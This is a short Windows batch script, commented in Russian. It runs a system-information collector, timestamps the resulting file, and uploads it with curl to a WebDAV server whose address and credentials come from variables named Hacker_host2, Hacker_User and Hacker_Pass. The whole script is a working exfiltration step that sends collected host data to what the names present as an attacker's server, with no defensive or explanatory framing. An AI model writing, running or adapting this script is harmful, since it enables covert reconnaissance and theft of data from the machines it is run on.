@echo on
call %PUB1%\Util\getsysteminfocheck.cmd

set CURDATE=%DATE%
if "%TIME:~0,1%"==" "  GOTO CHECK
set CURTIME=%TIME%
GOTO NEXTOP
:CHECK
set CURTIME=0%TIME:~1,8%
:NEXTOP

set newname2=MySystemInfoCheck-%CURDATE:~8,2%%CURDATE:~3,2%%CURDATE:~0,2%_%CURTIME:~0,2%%CURTIME:~3,2%%CURTIME:~6,2%.txt
move /Y %PUB1%\Util\MySystemInfoCheck.txt %PUB1%\Util\%newname2%

rem Определяем переменные:
rem Основная папка
set Mainfolder=webdav
rem Префикс протокола
set pref=%Hacker_pref%
rem HTTP Port
set port=%Hacker_port%

rem HTTP WebDAV Host
set host=%pref%://%Hacker_host2%:%port%/%MainFolder%/
rem WebDAV User
set user=%Hacker_User%
rem WebDAV Password
set password=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Util
 
rem Переходим в каталог сервера

cd /d %LocalFolder%
 
curl --upload-file %PUB1%\Util\%newname2%  -v --user %user%:%password% %host%

